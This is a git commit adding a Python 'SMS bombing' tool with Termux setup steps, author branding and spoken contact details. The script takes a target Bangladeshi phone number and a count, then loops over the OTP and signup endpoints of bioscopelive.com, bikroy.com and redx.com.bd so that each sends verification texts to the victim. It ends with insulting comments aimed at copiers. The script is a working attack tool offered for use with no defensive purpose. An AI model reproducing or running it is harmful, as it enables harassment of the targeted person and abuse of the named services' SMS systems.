2d0a88eb6b5b5d5b6bce6ad5f1d83899dbce129d
Boniyamin69 <132061593+Boniyamin69@users.noreply.github.com>
2023-06-14 11:47:53 +0600

    Add files via upload

---
+++ work-sms.py
@@ -0,0 +1,128 @@
+import os
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] YAMIN💀 CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS YAMIN💀 CYBER KING YAMIN💀\033[1;30m")
+os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH YAMIN💀 CYBER KING OFF YAMIN💀 "')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("clear")
+logo3=("""
+$$\     $$\  $$$$$$\  $$\      $$\ $$$$$$\ $$\   $$\ 
+\$$\   $$  | $$  __$$\ $$$\    $$$ |\_$$  _|$$$\  $$ |
+ \$$\ $$  / $$ /  $$ |$$$$\  $$$$ |  $$ |  $$$$\ $$ |
+  \$$$$  /  $$$$$$$$ |$$\$$\$$ $$ |  $$ |  $$ $$\$$ |
+   \$$  /   $$  __$$ |$$ \$$$  $$ |  $$ |  $$ \$$$$ |
+    $$ |    $$ |  $$ |$$ |\$  /$$ |  $$ |  $$ |\$$$ |
+    $$ |    $$ |  $$ |$$ | \_/ $$ |$$$$$$\ $$ | \$$ |
+    \__|    \__|  \__|\__|     \__|\______|\__|  \__|
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SMS BOOMBING TOOLS               \033[;0m\033[1;91m\033[1;92m
+
+
+\033[1;32m[-] TOOLS TYPE:\033[1;32m FREE
+\033[1;32m[-] AUTHOR    :\033[1;32m BONI YAMIN 
+\033[1;32m[-] GITHUB    :\033[1;32m YAMIN69
+\033[1;32m[-] FACEBOOK  :\033[1;32m BONI YAMIN
+""")
+os.system('espeak -a 300 "author YAMIN💀 "')
+os.system('espeak -a 300 "Facebook  YAMIN💀  "')
+os.system('espeak -a 300 "whathapp 01567********* "')
+os.system('espeak -a 300 "github YAMIN💀 cyber 9 9 4 8 7 "')
+os.system('espeak -a 300 "telegram 01567********* "')
+os.system('espeak -a 300 "imo 01567********* "')
+os.system('espeak -a 300 "from Bangladesh "')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  SMS WAS SENT🐼")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+\x1b[38;5;196m SEN🐼        
+       \x1b[38;5;196m╔═════════════════════════════════╗
+       \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  .d8888b.  \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m888        888    888 d88P  Y88b \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m8888888    8888888888 888        \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m888        888    888 888        \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m888        888    888 Y88b  d88P \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  "Y8888P"  \x1b[38;5;196m║\x1b[38;5;196m
+       \x1b[38;5;196m╚═════════════════════════════════╝
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46mBONIYAMIN🥵✌️𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m║\033[38;5;46mYAMIN💀             \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[Y]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m║\033[38;5;46mBONI YAMIN      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01567*********     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[M]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m║\033[38;5;46mYAMIN💀 𝐂𝐘𝐁𝐄𝐑 𝟗𝟗𝟒𝟖𝟕 \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[A]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01567*********     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐈𝐌𝐎       \x1b[38;5;196m║  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m║\033[38;5;46m01567*********     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46mBONI𝗘??𝗥𝗔𝗡𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46mBONI YAMIN🥵✌️𝄟⃝  \x1b[38;5;196m╚══════════════════╝
+      \033[38;5;46m____  ____  _  ________
+     \033[38;5;46m/ __ \/ __ \/ | / / ____/
+    \033[38;5;46m/ / / / / / /  |/ / __/   
+   \033[38;5;46m/ /_/ / /_/ / /|  / /___   
+  \033[38;5;46m/_____/\____/_/ |_/_____/   
+                            
+ TNQ FOR USING OUR TOOLS 🖤
+""")
+#madarcod ase geli script curi korte 🙂
+#bancod tk khoroc kore nijeo to sikhte paros
